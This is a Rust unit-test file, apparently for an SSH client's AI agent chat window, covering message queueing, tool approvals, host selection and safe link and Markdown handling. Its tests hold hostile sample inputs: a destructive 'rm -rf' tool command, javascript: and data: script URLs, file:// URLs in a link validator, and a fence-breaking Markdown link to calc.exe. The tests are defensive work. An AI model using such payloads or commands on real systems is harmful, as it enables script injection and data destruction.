    state.apply_agent_event(AgentEvent::ResumeFailed);

    let notices = &assistant(&state).notices;
    assert_eq!(notices.len(), 2);
    assert!(notices[0].error);
    assert!(notices[0].text.contains("连接失败"));
    assert!(notices[1].text.contains("续接"));
}

#[test]
fn a_system_line_is_its_own_message_not_a_header_under_the_last_assistant_reply() {
    let mut state = real_started();
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "好".to_owned(),
    });
    state.apply_agent_event(AgentEvent::TurnEnd);
    let before = state.messages.len();
    state.push_system_line("已改绑到 db-1");
    // 单独一条，不往助手消息里塞提示，也不为它新建一条空的助手消息。
    assert_eq!(state.messages.len(), before + 1);
    assert!(matches!(
        state.messages.last(),
        Some(ChatMessage::System(text)) if text == "已改绑到 db-1"
    ));
    assert!(assistant(&state).notices.is_empty());
    // 提示行是界面状态：不进历史。
    let draft = state.history_draft("t", None, None);
    assert!(
        draft
            .messages
            .iter()
            .all(|m| !format!("{m:?}").contains("改绑")),
        "{:?}",
        draft.messages
    );
}

#[test]
fn stopping_a_real_turn_does_not_need_a_script() {
    let mut state = real_started();
    state.apply_agent_event(AgentEvent::ToolStart {
        call_id: "toolu_1".to_owned(),
        tool: "run_command".to_owned(),
        input: json!({ "command": "sleep 60" }),
    });
    assert!(state.is_running());
    assert!(state.stop());

    assert!(!state.is_running());
    let message = assistant(&state);
    assert!(message.stopped);
    assert_eq!(message.tools[0].status, ToolStatus::Stopped);
    assert_eq!(message.tools[0].error.as_deref(), Some("已停止"));
}

// ---- V2-U1：回合进行中补充的消息（待发送队列） ----

use std::time::{Duration, Instant};

#[test]
fn a_message_typed_while_the_turn_runs_waits_and_goes_out_when_it_ends() {
    let mut state = real_started();
    assert!(state.enqueue("补充一：看看内存").is_some());
    assert!(state.enqueue("补充二：再看磁盘").is_some());
    assert_eq!(state.queue.len(), 2);
    let now = Instant::now();
    assert_eq!(state.take_queue_to_send(now), None, "回合还在跑，不发");

    state.apply_agent_event(AgentEvent::TextDelta {
        text: "答复".to_owned(),
    });
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert!(!state.is_running());
    assert_eq!(
        state.take_queue_to_send(now).as_deref(),
        Some("补充一：看看内存\n\n补充二：再看磁盘"),
        "回合结束后按顺序合并成一条"
    );
    assert!(state.queue.is_empty());
    // 合并出来的那条作为新一回合发出。
    assert!(state.start_real_turn("补充一：看看内存\n\n补充二：再看磁盘"));
    assert!(state.is_running());
}

#[test]
fn nothing_is_queued_when_no_turn_is_running() {
    let mut state = ChatState::default();
    assert_eq!(
        state.enqueue("直接发"),
        None,
        "没在跑：调用方直接发，不排队"
    );
    assert!(state.queue.is_empty());
}

#[test]
fn a_turn_that_ended_with_an_error_still_sends_the_queue() {
    let mut state = real_started();
    state.enqueue("出错之后再试");
    state.apply_agent_event(AgentEvent::Error {
        message: "模型报错".to_owned(),
    });
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert_eq!(
        state.take_queue_to_send(Instant::now()).as_deref(),
        Some("出错之后再试")
    );
}

#[test]
fn a_turn_that_ends_with_an_unanswered_approval_still_sends_the_queue() {
    let mut state = real_started();
    state.apply_agent_event(AgentEvent::ToolStart {
        call_id: "toolu_1".to_owned(),
        tool: "run_command".to_owned(),
        input: json!({ "command": "rm -rf /tmp/x" }),
    });
    state.enqueue("改成只读检查");
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert!(state.take_queue_to_send(Instant::now()).is_some());
}

#[test]
fn stopping_holds_the_queue_so_nothing_is_sent_by_itself() {
    let mut state = real_started();
    state.enqueue("补充");
    assert!(state.stop_by_user());
    assert!(!state.is_running());
    assert_eq!(state.queue.len(), 1, "留在队列里");
    assert_eq!(
        state.take_queue_to_send(Instant::now()),
        None,
        "点了停止：不自动发"
    );
    // 停止之后迟到的收尾事件也不会让它自己发出去。
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert_eq!(state.take_queue_to_send(Instant::now()), None);
    // 用户明确点「现在发送」：放开之后才发。
    state.queue.release();
    assert_eq!(
        state.take_queue_to_send(Instant::now()).as_deref(),
        Some("补充")
    );
}

#[test]
fn stopping_without_a_queue_leaves_no_hold_behind() {
    let mut state = real_started();
    assert!(state.stop_by_user());
    assert!(state.start_real_turn("再来一个"));
    state.enqueue("补充");
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert!(
        state.take_queue_to_send(Instant::now()).is_some(),
        "停止时队列是空的，不留扣住的痕迹"
    );
}

#[test]
fn interrupt_stops_the_turn_and_waits_for_the_old_turn_end_before_sending() {
    let mut state = real_started();
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "旧回合的开头".to_owned(),
    });
    state.enqueue("打断：改查网络");
    let start = Instant::now();
    assert!(state.queue_can_interrupt());
    assert!(state.interrupt_for_queue(start));
    assert!(!state.is_running(), "走的是和「停止」同一条状态路径");
    assert!(assistant(&state).stopped);
    assert_eq!(
        state.take_queue_to_send(start + Duration::from_millis(500)),
        None,
        "旧回合还没收尾：不发，旧回合迟到的东西不能落进新回合"
    );
    // 旧回合迟到的文字在回合已停之后被丢弃。
    state.apply_agent_event(AgentEvent::TextDelta {
        text: "迟到的旧输出".to_owned(),
    });
    assert!(!assistant(&state).text.contains("迟到的旧输出"));
    // 旧回合的收尾事件到了：这时候才发。
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert_eq!(
        state
            .take_queue_to_send(start + Duration::from_millis(600))
            .as_deref(),
        Some("打断：改查网络")
    );
    assert!(state.start_real_turn("打断：改查网络"));
    assert!(state.is_running());
}

#[test]
fn interrupt_needs_a_running_turn_and_a_non_empty_queue() {
    let mut idle = ChatState::default();
    assert!(!idle.queue_can_interrupt());
    assert!(!idle.interrupt_for_queue(Instant::now()));

    let mut running = real_started();
    assert!(!running.queue_can_interrupt(), "队列是空的");
    assert!(!running.interrupt_for_queue(Instant::now()));
    assert!(running.is_running(), "什么也没动");
}

#[test]
fn a_new_turn_lets_a_held_queue_go_out_at_its_end() {
    let mut state = real_started();
    state.enqueue("留着的");
    state.stop_by_user();
    assert!(state.start_real_turn("用户自己又发了一条"));
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert_eq!(
        state.take_queue_to_send(Instant::now()).as_deref(),
        Some("留着的")
    );
}

#[test]
fn a_failed_send_keeps_the_queue_without_retrying_by_itself() {
    let mut state = real_started();
    state.enqueue("后面的");
    state.queue.hold(); // fail_turn / start_failed 做的事
    state.finish_real_turn();
    assert_eq!(state.take_queue_to_send(Instant::now()), None);
    assert_eq!(state.queue.len(), 1);
}

#[test]
fn new_conversation_drops_the_queue() {
    let mut state = real_started();
    state.enqueue("旧对话的补充");
    state.new_conversation();
    assert!(state.queue.is_empty());
}

#[test]
fn edit_and_remove_work_while_the_turn_is_running() {
    let mut state = real_started();
    let a = state.enqueue("甲").expect("收下");
    let b = state.enqueue("乙").expect("收下");
    assert!(state.queue.edit(a, "甲（改）"));
    assert!(state.queue.remove(b));
    state.apply_agent_event(AgentEvent::TurnEnd);
    assert_eq!(
        state.take_queue_to_send(Instant::now()).as_deref(),
        Some("甲（改）")
    );
}

#[test]
fn no_host_is_selected_by_default_and_hosts_can_be_added_and_removed() {
    // 审查 M1：旧版默认选主机库第一台、切换只增不减；0.2.14 没选过就没有目标。
    let hosts = vec![
        HostChoice::plain(3, "web-1", "deploy"),
        HostChoice::plain(8, "db-1", "admin"),
    ];
    let mut selected: Vec<i64> = Vec::new();
    assert!(
        selected_targets(&hosts, &selected).is_empty(),
        "默认一台都不选"
    );
    assert_eq!(host_names_label(&selected_targets(&hosts, &selected)), None);

    assert!(toggle_host_selection(&mut selected, 8), "点一下选中");
    assert!(toggle_host_selection(&mut selected, 3));
    let names: Vec<String> = selected_targets(&hosts, &selected)
        .into_iter()
        .map(|host| host.name)
        .collect();
    assert_eq!(names, ["web-1", "db-1"], "按主机库顺序，不按点击顺序");
    assert_eq!(
        host_names_label(&selected_targets(&hosts, &selected)).as_deref(),
        Some("web-1、db-1")
    );

    assert!(!toggle_host_selection(&mut selected, 8), "再点一下取消");
    let names: Vec<String> = selected_targets(&hosts, &selected)
        .into_iter()
        .map(|host| host.name)
        .collect();
    assert_eq!(names, ["web-1"]);

    // 主机库里已经删掉的主机不会留在目标里。
    selected.push(99);
    assert_eq!(selected_targets(&hosts, &selected).len(), 1);
    // 执行时宿主用的目标 ID 就是 `host-<id>`（由 sync_hosts 拼出来）。
    assert_eq!(host_target_id(hosts[0].id), "host-3");
}

#[test]
fn model_choices_start_with_default_and_cycle() {
    let catalog = AgentModelCatalog {
        models: vec![
            AgentModel {
                id: "claude/opus".to_owned(),
                name: "Opus".to_owned(),
                unavailable: false,
            },
            AgentModel {
                id: "claude/sonnet".to_owned(),
                name: "Sonnet".to_owned(),
                unavailable: false,
            },
        ],
        default: None,
        default_label: None,
    };
    let models = model_choices(&catalog);
    assert_eq!(models.len(), 3);
    assert_eq!(models[0].id, None);
    assert_eq!(model_label(&models, 0), "模型：默认");
    assert_eq!(model_label(&models, 1), "模型：Opus");
    assert_eq!(model_label(&models, 2), "模型：Sonnet");
    assert_eq!(models[1].id.as_deref(), Some("claude/opus"));

    assert_eq!(next_model_index(models.len(), 0), 1);
    assert_eq!(next_model_index(models.len(), 2), 0);
    assert_eq!(next_model_index(1, 0), 0, "只有「默认」时不动");
    assert_eq!(model_label(&[ModelChoice::default()], 0), "模型：默认");
}

#[test]
fn real_mode_is_the_product_default_and_the_demo_needs_the_debug_hook() {
    // 审查 H3：产品里真实智能体是默认模式，不再被 `ZSSH_AGENT_E2E` 锁死。
    assert!(start_in_real_mode(None), "没有任何钩子就是真实模式");
    assert!(start_in_real_mode(Some("0")));
    assert!(start_in_real_mode(Some("")));
    assert!(
        !start_in_real_mode(Some("1")),
        "只有演示钩子才从离线演示开始"
    );
    // 离线演示的切换入口只在调试版存在（发行版里 `dev_hooks::ENABLED` 是 false）。
    assert_eq!(demo_toggle_available(), cfg!(debug_assertions));
}

/// 窗口代码（编译期嵌进来），用来确认代码里没有某些路径。
///
/// 拆分之后代码分散在 `agent_chat` 的几个文件里；测试在 `tests.rs` /
/// `history_tests.rs`，不拼进来。
fn production_source() -> String {
    [
        include_str!("../agent_chat.rs"),
        include_str!("text.rs"),
        include_str!("demo.rs"),
        include_str!("model.rs"),
        include_str!("state.rs"),
        include_str!("approval.rs"),
        include_str!("history.rs"),
        include_str!("session.rs"),
        include_str!("actions.rs"),
        include_str!("view.rs"),
        include_str!("history_view.rs"),
        include_str!("window_view.rs"),
    ]
    .concat()
}

#[test]
fn the_window_never_reads_the_e2e_switch() {
    // `ZSSH_AGENT_E2E` 只给自动化测试用（agent_host 里的真实 claude 用例）；窗口代码里
    // 不能再出现读它的路径。源码在编译期嵌进来，在这里扫一遍。
    let body = production_source();
    let reads = body
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .any(|line| line.contains("\"ZSSH_AGENT_E2E\"") || line.contains("ZSSH_AGENT_REAL"));
    assert!(!reads, "窗口代码不该读 ZSSH_AGENT_E2E / ZSSH_AGENT_REAL");
}

// ---------------------------------------------------------------------
// 链接：和 0.2.14 一致，只复制网址，所有 handler 过 core 的校验
// ---------------------------------------------------------------------

#[test]
fn link_clicks_copy_valid_web_links_and_refuse_everything_else() {
    let (notice, copy) = link_click_notice("https://Example.com/a?b=1");
    assert_eq!(copy.as_deref(), Some("https://example.com/a?b=1"));
    assert!(!notice.error);
    assert!(
        notice.text.contains("https://example.com/a?b=1"),
        "要把完整网址显示出来"
    );

    for rejected in [
        "file:///C:/Windows/win.ini",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "ms-settings:network",
        "/relative/path",
        "relative/path",
        "//example.com",
        "mailto:someone@example.com",
        "https://exa mple.com",
        "",
    ] {
        let (notice, copy) = link_click_notice(rejected);
        assert!(copy.is_none(), "{rejected} 不能被复制/打开");
        assert!(notice.error, "{rejected}");
    }
}

#[test]
fn no_link_handler_opens_urls_directly() {
    // 审查 H2：旧代码在三处 `cx.open_url(...)`，其中原文模式连校验都没有。
    let body = production_source();
    let opens = body
        .lines()
        .filter(|line| !line.trim_start().starts_with("//"))
        .any(|line| line.contains("open_url("));
    assert!(!opens, "对话窗口里不该有直接打开网址的路径");
    // 每个 TextView 的链接 handler 都得经过同一个 open_link。
    let handlers = body.matches(".on_link_click(").count();
    let routed = body.matches("this.open_link(").count();
    assert!(handlers >= 2, "渲染/原文模式和历史面板都要挂 handler");
    assert!(routed >= handlers, "每个 handler 都走 open_link");
}

// ---------------------------------------------------------------------
// Markdown 渲染：复制内容、示例文本都是纯函数/常量，不起界面。
// ---------------------------------------------------------------------

#[test]
fn code_block_copy_text_normalizes_line_endings_and_trailing_blank_lines() {
    assert_eq!(code_block_copy_text("fn main() {}\n"), "fn main() {}");
    assert_eq!(code_block_copy_text("a\r\nb\r\n\r\n"), "a\nb");
    assert_eq!(code_block_copy_text("a\n\nb\n"), "a\n\nb");
    assert_eq!(code_block_copy_text(""), "");
}

#[test]
fn table_tsv_joins_rows_with_tabs_and_newlines() {
    let headers = vec!["名称".to_owned(), "说明".to_owned()];
    let rows = vec![
        vec!["终端".to_owned(), "SSH\t会话".to_owned()],
        vec!["SFTP".to_owned(), "文件\n传输".to_owned()],
    ];
    assert_eq!(
        table_tsv(&headers, &rows),
        "名称\t说明\n终端\tSSH 会话\nSFTP\t文件 传输"
    );
    assert_eq!(table_tsv(&[], &[]), "");
    // 流式表格可能还没表头或行列不齐，按现有单元格原样输出。
    let ragged = vec![
        vec!["只有一格".to_owned()],
        vec!["a".to_owned(), "b".to_owned()],
    ];
    assert_eq!(table_tsv(&[], &ragged), "只有一格\na\tb");
}

#[test]
fn markdown_sample_covers_the_rendered_blocks() {
    assert!(MARKDOWN_SAMPLE.contains("## "), "要有标题");
    assert!(MARKDOWN_SAMPLE.contains("\n- "), "要有列表");
    assert!(MARKDOWN_SAMPLE.contains("| --- |"), "要有表格分隔行");
    assert!(MARKDOWN_SAMPLE.contains("```rust"), "要有代码块");
    assert!(MARKDOWN_SAMPLE.contains("](https://"), "要有链接");
}

// ---------------------------------------------------------------------
// 原文 / 渲染：只测纯状态和纯函数，不构建界面。
// ---------------------------------------------------------------------

#[test]
fn raw_markdown_block_uses_a_four_backtick_fence_and_keeps_newlines() {
    let text = "第一行\n\n```rust\nfn main() {}\n```\n最后一行";
    let block = raw_markdown_block(text);
    assert!(block.starts_with("````markdown\n"), "{block}");
    assert!(block.ends_with("\n````"), "{block}");
    assert!(block.contains(text), "原文要一字不动地留在代码块里");
    // 正文自带的三个反引号围栏不能提前结束外层代码块。
    assert_eq!(block.matches("````").count(), 2, "{block}");
    assert!(block.contains("\n\n```rust\n"), "换行要保留");
    // 代码块「复制」拿到的是原文本身（围栏和末尾换行由视图剥掉）。
    assert_eq!(code_block_copy_text(&block[13..block.len() - 5]), text);
}

#[test]
fn raw_toggle_flips_show_raw_and_back() {
    let mut state = started();
    assert!(!assistant(&state).show_raw);
    assert_eq!(body_mode(assistant(&state)), BodyMode::Rendered);
    assert_eq!(BodyMode::Rendered.toggle_label(), "原文");

    assert!(state.toggle_raw(1));
    assert!(assistant(&state).show_raw);
    assert_eq!(body_mode(assistant(&state)), BodyMode::Raw);
    assert_eq!(BodyMode::Raw.toggle_label(), "渲染");

    assert!(state.toggle_raw(1));
    assert!(!assistant(&state).show_raw);
    assert_eq!(body_mode(assistant(&state)), BodyMode::Rendered);

    // 用户消息和越界下标没有原文可切。
    assert!(!state.toggle_raw(0));
    assert!(!state.toggle_raw(99));
}

#[test]
fn body_mode_picks_raw_or_rendered_text() {
    let mut message = AssistantMessage::default();
    assert_eq!(body_markdown(&message, BodyMode::Rendered), None);
    assert_eq!(
        body_markdown(&message, BodyMode::Raw).as_deref(),
        Some(t(ChatMsg::NoBody))
    );

    message.text = "**粗体**\n第二行".to_owned();
    assert_eq!(
        body_markdown(&message, BodyMode::Rendered).as_deref(),
        Some("**粗体**\n第二行"),
        "渲染模式用正文原文喂 Markdown"
    );
    let raw = body_markdown(&message, BodyMode::Raw).expect("原文模式总有内容");
    assert_eq!(raw, raw_markdown_block("**粗体**\n第二行"));
    assert!(raw.contains("\n第二行"), "原文模式的换行不能丢");

    // 切换显示不能动正文本身。
    message.show_raw = true;
    assert_eq!(message.text, "**粗体**\n第二行");
}

#[test]
fn approvals_the_bridge_dropped_are_marked_failed_not_left_clickable() {
    let mut state = real_started();
    assert!(state.approval_prompt(1, &approval_request("uptime")));
    assert!(state.approval_prompt(2, &approval_request("df -h")));
    // 宿主说 1 还在等、2 已经没人等了（超时 / 停止 / 目标被取消选择）。
    assert!(state.expire_dead_approvals(|id| id == 1));
    let tools = &assistant(&state).tools;
    assert_eq!(
        tools[0].approval,
        ApprovalState::Pending,
        "还在等的保持原样"
    );
    assert_eq!(tools[1].approval, ApprovalState::Denied);
    assert_eq!(tools[1].status, ToolStatus::Failed);
    assert!(tools[1].error.is_some());
    assert!(
        state.real_approval("approval-2").is_none(),
        "不再是可回答的确认"
    );
    assert!(
        !state.expire_dead_approvals(|id| id == 1),
        "没有新的失效就不变"
    );
}

#[test]
fn long_bodies_and_outputs_are_folded_until_expanded() {
    // 审查 M5：长对话/长输出每帧全量渲染会卡死。
    let long = "字".repeat(BODY_PREVIEW_CHARS + 500);
    let (shown, clipped) = clipped_body(&long, false);
    assert!(clipped);
    assert_eq!(shown.chars().count(), BODY_PREVIEW_CHARS);
    let (shown, clipped) = clipped_body(&long, true);
    assert!(!clipped);
    assert_eq!(shown, long);
    let (_, clipped) = clipped_body("短正文", false);
    assert!(!clipped);

    let mut state = ChatState::default();
    state
        .messages
        .push(ChatMessage::Assistant(AssistantMessage {
            text: long.clone(),
            ..AssistantMessage::default()
        }));
    let message = match &state.messages[0] {
        ChatMessage::Assistant(message) => message.clone(),
        ChatMessage::User(_) | ChatMessage::System(_) => unreachable!("刚放进去的是助手消息"),
    };
    let source = body_markdown(&message, BodyMode::Rendered).expect("有正文");
    assert_eq!(
        source.chars().count(),
        BODY_PREVIEW_CHARS,
        "渲染的只是前一段"
    );
    assert!(state.toggle_body_expanded(0));
    let message = match &state.messages[0] {
        ChatMessage::Assistant(message) => message.clone(),
        ChatMessage::User(_) | ChatMessage::System(_) => unreachable!("刚放进去的是助手消息"),
    };
    assert_eq!(
        body_markdown(&message, BodyMode::Rendered).expect("有正文"),
        long
    );
}

#[test]
fn expand_toggles_reach_the_right_card() {
    let mut state = real_started();
    assert!(state.approval_prompt(1, &approval_request("uptime")));
    let (message_index, tool_index) = (state.active.expect("有活动消息"), 0);
    assert!(state.toggle_command_expanded(message_index, tool_index));
    assert!(state.toggle_diff_expanded(message_index, tool_index));
    assert!(state.toggle_output_full(message_index, tool_index));
    let card = &assistant(&state).tools[0];
    assert!(
        card.detail
            .as_ref()
            .is_some_and(|d| d.command_expanded && d.diff_expanded)
    );
    assert!(card.output_full);
    assert!(state.toggle_command_expanded(message_index, tool_index));
    assert!(
        !assistant(&state).tools[0]
            .detail
            .as_ref()
            .is_some_and(|d| d.command_expanded)
    );
    assert!(!state.toggle_command_expanded(message_index, 7), "越界不动");
    assert!(!state.toggle_command_expanded(99, 0));
}

#[test]
fn raw_mode_fence_cannot_be_closed_by_the_text_itself() {
    // 审查 H2 缺陷 C：固定四反引号围栏被正文里的 4 个以上反引号提前关闭，之后的内容
    // 按 Markdown 渲染（链接可点）。
    let nasty = format!(
        "前文\n{}\n[x](file:///C:/Windows/System32/calc.exe)\n{}ignored",
        "`".repeat(4),
        "`".repeat(9)
    );
    let block = raw_markdown_block(&nasty);
    let fence = "`".repeat(10);
    assert!(block.starts_with(&format!("{fence}markdown\n")), "{block}");
    assert!(block.ends_with(&format!("\n{fence}")), "{block}");
    // 正文里最长的一串是 9 个，比围栏短，所以不会提前关闭。
    let inner = &block[fence.len()..block.len() - fence.len()];
    assert!(!inner.contains(&fence));
}

// ---- V2-U31：消息的复制内容（不碰系统剪贴板：这里只验证"要复制什么"，写入口见 chat_copy 的测试）----

fn notice(text: &str, error: bool) -> super::Notice {
    super::Notice {
        text: text.to_owned(),
        error,
    }
}

#[test]
fn copying_an_assistant_message_gives_the_markdown_source_not_the_clipped_preview() {
    let source = format!(
        "## 标题\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n```rust\nfn main() {{}}\n```\n\n{}",
        "很长的正文。".repeat(BODY_PREVIEW_CHARS)
    );
    let message = AssistantMessage {
        text: source.clone(),
        ..AssistantMessage::default()
    };
    let copied = super::assistant_copy_text(&message);
    assert_eq!(
        copied, source,
        "整段 Markdown 原文，不是渲染后的、也不是只显示的前一段"
    );
    assert!(copied.chars().count() > BODY_PREVIEW_CHARS);
    assert!(copied.contains("```rust") && copied.contains("|---|---|"));
}

#[test]
fn an_error_notice_copies_its_complete_text() {
    let full = "错误：连接 192.0.2.17:22 超时（15 秒）\n请检查网络后重试。\n".to_owned()
        + &"详细信息 ".repeat(400);
    assert_eq!(super::notice_copy_text(&notice(&full, true)), full);
    // 和界面显示用的是同一个脱敏函数：路径不会因为复制而多出来。
    let with_path = r"错误：找不到 C:\Users\someone\app\a.log";
    assert_eq!(
        super::notice_copy_text(&notice(with_path, true)),
        crate::agent_text::redact_paths(with_path)
    );
}

#[test]
fn a_message_without_body_has_nothing_to_copy_as_a_whole() {
    // 只有提示：提示各自复制，整条消息不画复制按钮（空串）。
    let only_notices = AssistantMessage {
        notices: vec![notice("错误：第一条", true), notice("正在重试", false)],
        ..AssistantMessage::default()
    };
    assert_eq!(super::assistant_copy_text(&only_notices), "");
    // 有正文：只复制正文，提示是各自独立复制的。
    let with_text = AssistantMessage {
        text: "好的".to_owned(),
        notices: vec![notice("错误：x", true)],
        ..AssistantMessage::default()
    };
    assert_eq!(super::assistant_copy_text(&with_text), "好的");
}

#[test]
fn the_context_menu_copies_the_selection_or_else_the_whole_message() {
    assert_eq!(
        super::copy_menu_choice("", "整条消息"),
        ("复制", "整条消息".to_owned())
    );
    assert_eq!(
        super::copy_menu_choice("  \n", "整条消息"),
        ("复制", "整条消息".to_owned()),
        "只有空白的选区不算"
    );
    assert_eq!(
        super::copy_menu_choice("选中的一段", "整条消息"),
        ("复制选中文字", "选中的一段".to_owned())
    );
}

#[test]
fn every_message_has_its_own_hover_group() {
    assert_ne!(
        super::copy_group("agent-chat-msg-1"),
        super::copy_group("agent-chat-msg-2")
    );
    assert_ne!(
        super::copy_group("agent-chat-msg-1"),
        super::copy_group("agent-chat-notice-1-0")
    );
}
